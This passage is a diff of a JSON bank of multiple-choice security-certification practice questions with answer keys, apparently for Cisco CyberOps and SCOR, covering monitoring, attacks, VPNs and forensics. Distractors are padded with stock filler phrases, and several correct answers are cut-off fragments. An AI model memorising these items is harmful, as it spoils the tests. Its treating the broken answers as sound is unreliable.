+        "explanation": "Attack Vector rates whether the exploit needs physical, local, adjacent or network reach to the vulnerable component.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.7"
+      },
+      {
+        "question": "Which access control model assigns permissions based on the subject's job role?",
+        "options": [
+          "DAC",
+          "MAC",
+          "RBAC",
+          "ABAC"
+        ],
+        "correct": 2,
+        "explanation": "Role-Based Access Control (RBAC) grants rights according to roles; DAC is owner-driven, MAC is label-based, ABAC uses attributes.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.6"
+      },
+      {
+        "question": "What does Attribute-Based Access Control (ABAC) use to decide access?",
+        "options": [
+          "Only a single shared password",
+          "Attributes of subject",
+          "The MAC address alone for day-to-day operations",
+          "The colour of the badge"
+        ],
+        "correct": 1,
+        "explanation": "ABAC evaluates attributes of the user, resource, action and context (time, location) against policies to allow or deny.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.6"
+      },
+      {
+        "question": "What is the core idea of defense in depth for a SOC analyst?",
+        "options": [
+          "One perfect control is enough for day-to-day operations",
+          "Multiple overlapping controls raise the chance of detection and delay",
+          "Logging should be disabled to save space when no other controls exist",
+          "All traffic should be trusted inside the LAN"
+        ],
+        "correct": 1,
+        "explanation": "Defense in depth means layered controls so detection and delay remain possible even if one layer fails.",
+        "difficulty": "Easy",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.5"
+      },
+      {
+        "question": "What five fields make up the classic 5-tuple used to isolate a host in network logs?",
+        "options": [
+          "Source IP, destination IP, source port, destination port, protocol",
+          "Username, password, VLAN, SSID, gateway according to common practice",
+          "MAC, serial number, model, firmware, vendor",
+          "File hash, path, size, owner, ACL for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "The 5-tuple (src IP, dst IP, src port, dst port, protocol) uniquely identifies a flow and helps isolate a compromised host in grouped logs.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.10"
+      },
+      {
+        "question": "How does rule-based detection differ from behavioral detection?",
+        "options": [
+          "Rule-based matches known signatures; behavioral looks for deviations from normal",
+          "Rule-based only works offline; behavioral only works online",
+          "They are identical approaches according to common practice without additional tooling",
+          "Behavioral never generates alerts when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Rule/signature detection matches known patterns; behavioral/statistical detection flags anomalies against a baseline of normal activity.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.11"
+      },
+      {
+        "question": "Why can encryption make security monitoring harder?",
+        "options": [
+          "It slows down the CPU only in most production environments",
+          "Encrypted payloads hide content from network sensors that lack decryption",
+          "It deletes all logs in most production environments without additional tooling",
+          "It disables DHCP during routine maintenance windows"
+        ],
+        "correct": 1,
+        "explanation": "End-to-end encryption hides payload content from NIDS/proxies that cannot decrypt, reducing visibility into malicious content.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.8"
+      },
+      {
+        "question": "How do attack surface and vulnerability differ?",
+        "options": [
+          "Attack surface is the set of exposed points",
+          "They are synonyms during routine maintenance windows",
+          "Attack surface is always a bug",
+          "A vulnerability is the number of open ports only"
+        ],
+        "correct": 0,
+        "explanation": "Attack surface is the collection of entry points an adversary can try; a vulnerability is a concrete weakness that may exist on those points.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.1"
+      },
+      {
+        "question": "What type of data does NetFlow primarily provide for security monitoring?",
+        "options": [
+          "Full packet payloads when no other controls exist",
+          "Session metadata such as who talked to whom",
+          "Disk encryption keys",
+          "Email body content across mixed vendor fleets"
+        ],
+        "correct": 1,
+        "explanation": "NetFlow (and similar flow data) records connection metadata — endpoints, ports, bytes, duration — without storing full payloads.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "2.2"
+      },
+      {
+        "question": "What does a full packet capture (PCAP) give you that NetFlow does not?",
+        "options": [
+          "Only the source MAC address",
+          "The actual payload contents of the packets",
+          "Only the VLAN ID when no other controls exist",
+          "Only DHCP leases for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "PCAP stores complete packets including payloads, enabling deep content analysis that flow metadata alone cannot provide.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "2.2"
+      },
+      {
+        "question": "How does a next-generation firewall (NGFW) typically differ from a traditional stateful firewall?",
+        "options": [
+          "An NGFW adds application awareness",
+          "An NGFW never tracks state",
+          "An NGFW only works on Layer 1",
+          "There is no difference in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "NGFWs add application identification, URL/content filtering and often intrusion prevention and malware inspection on top of stateful filtering.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "2.2"
+      },
+      {
+        "question": "How can NAT/PAT reduce visibility for a SOC reviewing inbound traffic?",
+        "options": [
+          "By hiding many internal hosts behind one public address",
+          "By deleting all NetFlow records across mixed vendor fleets",
+          "By encrypting the SIEM for day-to-day operations",
+          "By disabling DNS in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "PAT multiplexes many internal hosts behind one public IP, so inbound logs may show only the public address unless internal logs are correlated.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Which best describes a protocol-based network attack?",
+        "options": [
+          "Abusing protocol features or weaknesses (e.g. SYN floods",
+          "Only phishing via email in typical enterprise networks",
+          "Only physical theft of a laptop in most production environments",
+          "Only cracking offline password hashes"
+        ],
+        "correct": 0,
+        "explanation": "Protocol-based attacks misuse protocol behaviour (floods, amplification, malformed packets) to disrupt or deceive network services.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
+      },
+      {
+        "question": "What is the main goal of a cross-site scripting (XSS) attack?",
+        "options": [
+          "Inject malicious scripts into a trusted web page viewed by other users",
+          "Flood a DNS server with queries in typical enterprise networks",
+          "Steal a hardware security module for day-to-day operations",
+          "Rewrite BGP routes in most production environments in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "XSS injects attacker-controlled script into a page that victims' browsers trust, often to steal sessions or perform actions as the user.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
+      },
+      {
+        "question": "What does a command injection attack against a web app typically try to do?",
+        "options": [
+          "Run OS shell commands via unsanitized input",
+          "Improve the page layout for day-to-day operations",
+          "Rotate TLS certificates",
+          "Disable JavaScript in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Command injection passes attacker-controlled input into a shell or system call, letting the attacker run commands on the server.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
+      },
+      {
+        "question": "How can generative AI change social-engineering attacks?",
+        "options": [
+          "It can produce more convincing, personalized phishing at scale",
+          "It makes social engineering impossible in typical enterprise networks",
+          "It only helps defenders, never attackers",
+          "It removes the need for any network access"
+        ],
+        "correct": 0,
+        "explanation": "Generative AI can craft fluent, personalized phishing and deepfakes at scale, raising the quality of social-engineering lures.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.7"
+      },
+      {
+        "question": "What is the role of a command-and-control (C2) channel in an endpoint attack?",
+        "options": [
+          "It lets the attacker remotely direct compromised hosts",
+          "It is the antivirus update feed",
+          "It is the DHCP lease renewal for day-to-day operations",
+          "It is the printer spooler across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "C2 is the communication path used by malware so the attacker can issue commands and receive data from compromised hosts.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.8"
+      },
+      {
+        "question": "Why do attackers use tunneling or encryption as evasion techniques?",
+        "options": [
+          "To make malicious traffic look like or hide inside allowed protocols",
+          "To speed up legitimate downloads when no other controls exist",
+          "To reduce CPU use on the victim without additional tooling",
+          "To force patching in most production environments according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "Tunneling and encryption hide C2 or exfiltration inside protocols that are allowed (HTTPS, DNS, SSH), bypassing simple filters.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
+      },
+      {
+        "question": "How do certificates affect security monitoring of HTTPS traffic?",
+        "options": [
+          "Without TLS interception or endpoint telemetry",
+          "Certificates delete all NetFlow",
+          "Certificates block ARP when no other controls exist",
+          "Certificates force IPv6 only"
+        ],
+        "correct": 0,
+        "explanation": "HTTPS encrypts payloads; without a TLS break-and-inspect point or host telemetry, network sensors see little of the content.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.10"
+      },
+      {
+        "question": "Which component of an X.509 certificate names the entity it belongs to?",
+        "options": [
+          "The Subject field",
+          "The TTL of a DNS record",
+          "The VLAN ID",
+          "The MTU size"
+        ],
+        "correct": 0,
+        "explanation": "The Subject (and Subject Alternative Name) fields identify the entity the certificate was issued for.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.11"
+      },
+      {
+        "question": "What does a host-based intrusion detection system (HIDS) mainly monitor?",
+        "options": [
+          "Activity and files on a single host",
+          "Only traffic between two routers",
+          "Only cloud billing in most production environments",
+          "Only printer queues"
+        ],
+        "correct": 0,
+        "explanation": "A HIDS watches host-level activity (logs, files, processes) on that machine, complementing network IDS.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "In digital forensics, what is corroborative evidence?",
+        "options": [
+          "Evidence that supports other evidence but is not sufficient alone",
+          "The only piece of evidence needed for day-to-day operations during routine maintenance windows",
+          "Evidence that contradicts the case for day-to-day operations",
+          "Evidence that must be deleted in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Corroborative evidence backs up other findings but would not prove the case by itself; best evidence is the most reliable primary source.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.4"
+      },
+      {
+        "question": "What does a malware sandbox (detonation chamber) report typically include?",
+        "options": [
+          "Observed behaviour of the sample when executed in a controlled environment",
+          "The victim's salary across mixed vendor fleets when no other controls exist",
+          "The office floor plan during routine maintenance windows",
+          "The Wi-Fi password of the SOC during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "A sandbox runs a sample in isolation and reports behaviour (files, network, registry) to help analysts classify it safely.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.6"
+      },
+      {
+        "question": "In detection quality, what is a false positive?",
+        "options": [
+          "An alert raised when there was no real threat",
+          "A correctly detected attack",
+          "A missed attack in typical enterprise networks",
+          "A successful login for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "A false positive is an alert that fires without a real malicious event, wasting analyst time; a false negative is a missed real attack.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.2"
+      },
+      {
+        "question": "How does deep packet inspection (DPI) differ from simple packet filtering?",
+        "options": [
+          "DPI examines payload content beyond just headers and ports",
+          "DPI only looks at the Ethernet preamble",
+          "DPI disables all logging during routine maintenance windows",
+          "DPI only works on UDP in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "Packet filters use headers/ports; DPI inspects application-layer payload content to identify threats or applications.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "4.3"
+      },
+      {
+        "question": "What is a key difference between inline IPS and a passive tap for monitoring?",
+        "options": [
+          "Inline can block traffic; a tap only observes a copy",
+          "A tap can block traffic; inline cannot",
+          "They are functionally identical",
+          "A tap encrypts all packets across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "An inline IPS sits in the path and can drop packets; a tap/SPAN only receives a copy and cannot block.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.4"
+      },
+      {
+        "question": "When analysing a PCAP of a suspected intrusion, which elements are key to identify first?",
+        "options": [
+          "Source and destination addresses",
+          "Only the capture file name for day-to-day operations",
+          "Only the analyst's username",
+          "Only the screen brightness"
+        ],
+        "correct": 0,
+        "explanation": "Key intrusion elements in a PCAP are who talked to whom (IPs), on which ports, which protocols, and what payloads look like.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.7"
+      },
+      {
+        "question": "Which artifact is commonly used to identify known malware samples across systems?",
+        "options": [
+          "A cryptographic file hash (e.g. SHA-256)",
+          "The colour of the desktop background",
+          "The printer model in most production environments",
+          "The office zip code"
+        ],
+        "correct": 0,
+        "explanation": "File hashes uniquely fingerprint samples so the same malware can be recognized across hosts and threat intel feeds.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.9"
+      },
+      {
+        "question": "Why do SOC analysts learn basic regular expressions?",
+        "options": [
+          "To match and extract patterns in logs and packet data efficiently",
+          "To replace the need for firewalls when no other controls exist",
+          "To assign IP addresses in most production environments",
+          "To configure RAID in most production environments according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "Regex lets analysts quickly filter and extract patterns (IPs, URLs, hashes) from large log and PCAP datasets.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.10"
+      },
+      {
+        "question": "What does vulnerability management mainly involve?",
+        "options": [
+          "Identifying, prioritizing and remediating weaknesses over time",
+          "Only buying new firewalls during routine maintenance windows",
+          "Only resetting passwords monthly without additional tooling",
+          "Only painting server racks according to common practice when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Vulnerability management is the ongoing process of finding, ranking and fixing weaknesses across the estate.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "5.1"
+      },
+      {
+        "question": "According to NIST SP 800-61, which activity belongs to the Preparation phase?",
+        "options": [
+          "Building playbooks, contacts and tooling before an incident",
+          "Deleting all evidence after an incident",
+          "Ignoring alerts in most production environments",
+          "Sharing passwords on a whiteboard for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "Preparation covers policies, playbooks, contacts, tooling and training so the team can respond effectively when an incident occurs.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "According to the order of volatility, which evidence should be captured before a disk image?",
+        "options": [
+          "CPU registers and RAM contents",
+          "Archived tape backups from last year",
+          "Printed manuals",
+          "Wall posters when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Volatile data (CPU, RAM, network state) disappears on power-off, so it is collected before less volatile storage such as disk images.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.6"
+      },
+      {
+        "question": "Which element is used when profiling a network for anomaly detection?",
+        "options": [
+          "Typical throughput, session duration, ports and critical asset address space",
+          "The colour of the patch cables in typical enterprise networks",
+          "The brand of the chairs for day-to-day operations in most production environments",
+          "The font used in emails in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "Network profiling baselines throughput, session lengths, ports in use and critical ranges so deviations stand out.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.7"
+      },
+      {
+        "question": "When profiling a server for security, which item is useful to baseline?",
+        "options": [
+          "Listening ports, logged-in users, running processes and applications",
+          "The wallpaper image during routine maintenance windows",
+          "The keyboard language only when no other controls exist",
+          "The desk height according to common practice when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Server profiling notes listening ports, accounts, processes and apps so unexpected services or users become visible.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.8"
+      },
+      {
+        "question": "Which data type is protected health information (PHI)?",
+        "options": [
+          "Medical records identifying a patient",
+          "A public weather forecast",
+          "An open-source software license",
+          "A network cable length in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "PHI is health information that can identify an individual and is protected under frameworks such as HIPAA.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "5.9"
+      },
+      {
+        "question": "What do SOC metrics such as time-to-detect and time-to-contain measure?",
+        "options": [
+          "How quickly the team finds and limits an incident",
+          "How fast printers print during routine maintenance windows",
+          "How bright the SOC lights are in typical enterprise networks",
+          "How many coffee cups are used"
+        ],
+        "correct": 0,
+        "explanation": "SOC metrics like TTD/TTC/TTR quantify response speed so the organisation can improve detection and containment.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.11"
+      },
+      {
+        "question": "In a suspicious DNS query seen in a PCAP, which fields are most useful to inspect?",
+        "options": [
+          "Query name, query type and response addresses",
+          "Only the Ethernet FCS during routine maintenance windows",
+          "Only the IP TTL according to common practice",
+          "Only the TCP window size"
+        ],
+        "correct": 0,
+        "explanation": "DNS analysis focuses on the queried name, type (A/AAAA/TXT/MX) and the answers returned, which often reveal C2 or tunneling.",
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.8"
+      },
+      {
+        "question": "What does a buffer overflow endpoint attack mainly try to achieve?",
+        "options": [
+          "Overwrite memory to alter program control flow",
+          "Improve memory safety during routine maintenance windows",
+          "Compress the binary in typical enterprise networks",
+          "Update the BIOS securely"
+        ],
+        "correct": 0,
+        "explanation": "A buffer overflow writes past a buffer's bounds to corrupt memory and often hijack control flow for arbitrary code execution.",
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.8"
+      },
+      {
+        "question": "What is threat hunting?",
+        "options": [
+          "Proactively searching for threats that automated detections may have missed",
+          "Waiting for vendors to email indicators according to common practice",
+          "Deleting all logs weekly during routine maintenance windows",
+          "Disabling EDR to reduce noise when no other controls exist in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Threat hunting is a proactive, hypothesis-driven search for adversary activity that existing alerts may not have caught.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
+      },
+      {
+        "question": "What does DevSecOps emphasize?",
+        "options": [
+          "Integrating security into the CI/CD pipeline instead of treating it as a final gate",
+          "Removing all automated tests without additional tooling in typical enterprise networks",
+          "Shipping without any reviews in most production environments",
+          "Storing secrets in source code in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "DevSecOps builds security into development and delivery pipelines (scanning, policy as code) rather than bolting it on at the end.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.3"
+      },
+      {
+        "question": "An analyst sees a Windows Security log with many 4625 failures followed by a 4624 for the same account from an unusual IP. What does this pattern most suggest?",
+        "options": [
+          "Possible brute-force that eventually succeeded",
+          "A successful disk defragmentation",
+          "A normal DHCP renew across mixed vendor fleets",
+          "A printer firmware update"
+        ],
+        "correct": 0,
+        "explanation": "Repeated logon failures (4625) then a success (4624) from an odd source is a classic sign of a successful brute-force or spraying attack.",
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "What characterizes a distributed denial-of-service (DDoS) attack?",
+        "options": [
+          "Many coordinated sources overwhelm a target's capacity",
+          "A single user mistypes a password once",
+          "A scheduled antivirus scan",
+          "A firmware update window in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "DDoS uses many (often botnet) sources to flood a target beyond its capacity, making service unavailable.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
+      },
+      {
+        "question": "What kind of data does Application Visibility and Control (AVC) typically add?",
+        "options": [
+          "Identification of applications beyond just port numbers",
+          "Only Layer-1 signal strength when no other controls exist",
+          "Only the serial numbers of switches",
+          "Only the office temperature in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "AVC classifies traffic by application (not just port), enabling policies and monitoring based on what apps are actually in use.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "2.2"
+      },
+      {
+        "question": "An alert shows a proxy log for a rare domain, an IPS signature hit on the same flow, and NetFlow with a large outbound byte count. What should the analyst do first?",
+        "options": [
+          "Correlate the sources to confirm a real exfiltration or C2 case",
+          "Ignore all three because they conflict for day-to-day operations",
+          "Delete the NetFlow in typical enterprise networks",
+          "Disable the proxy according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "Multiple independent sensors agreeing on the same flow raises confidence; correlate timestamps, IPs and users before containment.",
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.1"
+      },
+      {
+        "question": "Which cloud-specific threat involves stealing API keys that grant broad access to cloud resources?",
+        "options": [
+          "Compromised credentials and insecure APIs",
+          "Cable cut at the ISP for day-to-day operations",
+          "Printer paper jam according to common practice",
+          "Monitor backlight failure"
+        ],
+        "correct": 0,
+        "explanation": "Cloud breaches often stem from leaked API keys or weak APIs that grant wide access to storage and compute resources.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.1"
+      },
+      {
+        "question": "What is a prompt injection attack against an AI/LLM system?",
+        "options": [
+          "Crafting input that overrides the model's instructions to make it leak data or act wrongly",
+          "Injecting SQL into a database via a form during routine maintenance windows",
+          "Flooding a VPN concentrator in most production environments in typical enterprise networks",
+          "Overwriting BIOS firmware for day-to-day operations in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Prompt injection crafts user input that hijacks or overrides the system prompt, causing data leakage or unintended actions.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.3"
+      },
+      {
+        "question": "What does 'system prompt leakage' risk in an LLM deployment?",
+        "options": [
+          "Exposing hidden instructions that reveal policies or secrets to the user",
+          "Losing the GPU driver across mixed vendor fleets in most production environments",
+          "Breaking DHCP leases during routine maintenance windows",
+          "Disabling syslog for day-to-day operations without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "If an LLM reveals its hidden system prompt, attackers learn policies, tool instructions or secrets embedded there.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.3"
+      },
+      {
+        "question": "Why is post-quantum cryptography (PQC) becoming relevant for security architects?",
+        "options": [
+          "Large quantum computers may break widely used public-key algorithms",
+          "PQC makes Wi-Fi faster across mixed vendor fleets during routine maintenance windows",
+          "PQC replaces Ethernet cables in most production environments",
+          "PQC removes the need for MFA without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "PQC algorithms are designed to resist attacks from large-scale quantum computers that could break RSA and ECC.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
+      },
+      {
+        "question": "What is MASQUE in modern encrypted transport?",
+        "options": [
+          "A set of HTTP/3 mechanisms to proxy traffic over QUIC",
+          "A Layer-2 spanning-tree variant",
+          "A Windows event ID according to common practice",
+          "A RADIUS attribute for VLANs without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "MASQUE (Multiplexed Application Substrate over QUIC Encryption) defines HTTP/3 proxying so traffic can be securely relayed over QUIC.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
+      },
+      {
+        "question": "Which Cisco VPN technology builds hub-and-spoke or spoke-to-spoke IPsec overlays with NHRP?",
+        "options": [
+          "DMVPN",
+          "GETVPN",
+          "SSL clientless portal only",
+          "L2TP without IPsec"
+        ],
+        "correct": 0,
+        "explanation": "DMVPN uses mGRE and NHRP to build scalable hub-and-spoke (and spoke-to-spoke) IPsec VPN overlays.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
+      },
+      {
+        "question": "What does GETVPN mainly provide in an enterprise WAN?",
+        "options": [
+          "Group-encrypted traffic over a private WAN without per-peer tunnels",
+          "Guest Wi-Fi captive portal for day-to-day operations",
+          "Email spam filtering when no other controls exist in typical enterprise networks",
+          "Endpoint disk encryption across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "GETVPN uses GDOI group keys so sites on a private WAN encrypt traffic without building individual peer tunnels.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
+      },
+      {
+        "question": "What is the core principle of a zero trust architecture?",
+        "options": [
+          "Never trust, always verify",
+          "Trust all traffic inside the corporate LAN",
+          "Disable logging to reduce cost when no other controls exist",
+          "Open all ports for easier support"
+        ],
+        "correct": 0,
+        "explanation": "Zero trust assumes no implicit trust based on network location; every access request is authenticated, authorized and continuously evaluated.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.8"
+      },
+      {
+        "question": "What is Cisco SAFE in security architecture discussions?",
+        "options": [
+          "A design guide for secure architectures across places in the network",
+          "A cable colour standard in most production environments",
+          "A DHCP option number for day-to-day operations without additional tooling",
+          "A BGP community value for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "Cisco SAFE provides design guidance and business flows for building secure architectures across campus, WAN, data center and cloud.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.9"
+      },
+      {
+        "question": "When choosing between IPS and firewall capabilities, what does an IPS mainly add?",
+        "options": [
+          "Deep inspection to detect and block exploit/malware patterns in allowed traffic",
+          "Only Layer-2 MAC filtering across mixed vendor fleets",
+          "Only DHCP address assignment for day-to-day operations",
+          "Only cable testing according to common practice in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Firewalls enforce allow/deny policy; IPS inspects permitted traffic for exploit and malware patterns and can block them.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.1"
+      },
+      {
+        "question": "Which Layer-2 control helps stop rogue DHCP servers on a Cisco switch?",
+        "options": [
+          "DHCP snooping",
+          "STP PortFast only",
+          "LLDP",
+          "CDP across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "DHCP snooping builds a trusted binding table and drops DHCP replies from untrusted ports, blocking rogue DHCP servers.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "What does Dynamic ARP Inspection (DAI) use to validate ARP packets?",
+        "options": [
+          "The DHCP snooping binding database",
+          "The BGP routing table",
+          "The NTP stratum without additional tooling",
+          "The SNMP community string"
+        ],
+        "correct": 0,
+        "explanation": "DAI checks ARP against the DHCP snooping binding table and drops ARP packets that do not match trusted bindings.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Why do security teams use CIS Benchmarks for devices such as Secure Firewall (FTD) and IOS XE?",
+        "options": [
+          "They provide consensus hardening recommendations",
+          "They replace the need for any authentication",
+          "They define Wi-Fi channel plans only",
+          "They set the office thermostat according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "CIS Benchmarks offer vendor-agnostic, consensus hardening baselines that reduce common misconfigurations on network and security devices.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "2.5"
+      },
+      {
+        "question": "When troubleshooting AAA, how do TACACS+ and RADIUS mainly differ for device administration?",
+        "options": [
+          "TACACS+ separates auth/author/acct and encrypts the full payload",
+          "RADIUS always uses TCP 49; TACACS+ uses UDP 1812 in typical enterprise networks",
+          "They are identical in every way when no other controls exist",
+          "TACACS+ cannot authorize commands without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "TACACS+ (TCP) encrypts the whole packet and separates AAA functions, making it preferred for device admin; RADIUS mainly encrypts the password field.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.6"
+      },
+      {
+        "question": "Which protocol should replace SNMPv1/v2c for secure device management?",
+        "options": [
+          "SNMPv3 with authentication and privacy",
+          "Telnet for day-to-day operations",
+          "HTTP without TLS according to common practice",
+          "TFTP without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "SNMPv3 adds authentication and encryption (authPriv), unlike cleartext communities in SNMPv1/v2c.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.7"
+      },
+      {
+        "question": "On Cisco Secure Firewall (FTD), what do Access Control Policy rules with AVC and URL filtering enable?",
+        "options": [
+          "Allow/block based on application and URL category",
+          "Only MAC address filtering",
+          "Only static NAT without additional tooling",
+          "Only OSPF route filtering for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "FTD Access Control can match applications (AVC) and URL categories, enabling intent-based allow/block beyond 5-tuples.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.8"
+      },
+      {
+        "question": "Which client is commonly used with Cisco Secure Firewall for remote-access VPN?",
+        "options": [
+          "Cisco Secure Client (formerly AnyConnect)",
+          "Only a TFTP client for day-to-day operations",
+          "Only HyperTerminal according to common practice",
+          "Only a DHCP client"
+        ],
+        "correct": 0,
+        "explanation": "Cisco Secure Client (AnyConnect) provides remote-access VPN (and other modules) to Secure Firewall / ASA headends.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.9"
+      },
+      {
+        "question": "When an IPsec VPN tunnel on FTD fails to establish, which step is most useful first?",
+        "options": [
+          "Verify proposals, identities, routing and debug/log messages for Phase 1/2 failures",
+          "Replace all Ethernet cables immediately in most production environments",
+          "Disable logging without additional tooling across mixed vendor fleets when no other controls exist",
